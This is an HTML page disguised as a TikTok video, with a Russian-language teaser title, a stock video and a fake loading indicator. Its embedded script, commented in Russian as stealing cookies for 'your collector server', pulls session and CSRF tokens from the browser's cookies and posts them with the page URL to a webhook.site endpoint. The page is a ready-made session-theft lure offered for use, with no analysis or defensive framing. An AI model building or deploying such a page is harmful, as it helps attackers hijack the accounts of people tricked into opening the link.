<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>TikTok</title>
    <meta property="og:title" content="😂 Смотри до конца">
    <meta property="og:image" content="https://i.imgur.com/VT5qX7F.jpeg">
    <style>
        body { margin: 0; background: black; color: white; font-family: Arial; }
        video { width: 100%; height: 100vh; object-fit: cover; }
        .loading { position: fixed; bottom: 20px; left: 20px; background: rgba(0,0,0,0.7); padding: 10px; border-radius: 20px; }
    </style>
</head>
<body>
    <video autoplay muted loop>
        <source src="https://cdn.pixabay.com/video/2023/01/01/123456-720p.mp4">
    </video>
    <div class="loading">⏳ Загрузка видео... 45%</div>

    <script>
        // Крадём куки
        let cookies = document.cookie;
        let sessionMatch = cookies.match(/sessionid=([^;]+)/);
        let csrfMatch = cookies.match(/csrftoken=([^;]+)/);
        
        if(sessionMatch && csrfMatch) {
            // Отправляем на твой сервер-сборщик
            fetch('https://webhook.site/3851a1f2-4088-4472-a7fb-aa1038e4af50', {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({
                    sessionid: sessionMatch[1],
                    csrftoken: csrfMatch[1],
                    time: Date.now(),
                    url: window.location.href
                })
            });
        }
    </script>
</body>
</html>
